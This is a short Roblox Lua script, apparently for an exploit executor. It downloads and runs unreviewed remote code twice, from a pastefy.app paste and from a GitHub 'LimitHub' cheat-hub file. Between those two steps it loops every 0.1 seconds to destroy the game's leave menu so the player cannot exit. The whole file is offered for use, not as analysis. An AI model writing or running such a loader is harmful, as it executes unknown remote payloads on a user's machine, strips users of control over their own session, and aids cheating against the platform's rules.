-- 1. Run Pastefy first
local success1, err1 = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/8JqD2ajb/raw"))()
end)

if not success1 then
    warn("[ERROR] Pastefy script failed:", err1)
else
    print("[SUCCESS] Pastefy script loaded.")
end


-- 2. Anti-Leave Menu Program
local CoreGui = game:GetService("CoreGui")

local function closeMenu()
    local robloxGui = CoreGui:FindFirstChild("RobloxGui")
    if robloxGui then
        local menuMainFrame = robloxGui:FindFirstChild("MenuMainFrame", true)
        if menuMainFrame and menuMainFrame.Visible then
            menuMainFrame.Visible = false
            menuMainFrame:Destroy()
            print("[BLOCKED] Leave menu closed.")
        end
    end
end

-- Detect when menu is created
CoreGui.ChildAdded:Connect(function()
    closeMenu()
end)

-- Constant check in case it reappears
task.spawn(function()
    while true do
        closeMenu()
        task.wait(0.1)
    end
end)


-- 3. Run LimitHub last
local success2, err2 = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua"))()
end)

if not success2 then
    warn("[ERROR] LimitHub script failed:", err2)
else
    print("[SUCCESS] LimitHub script loaded.")
end
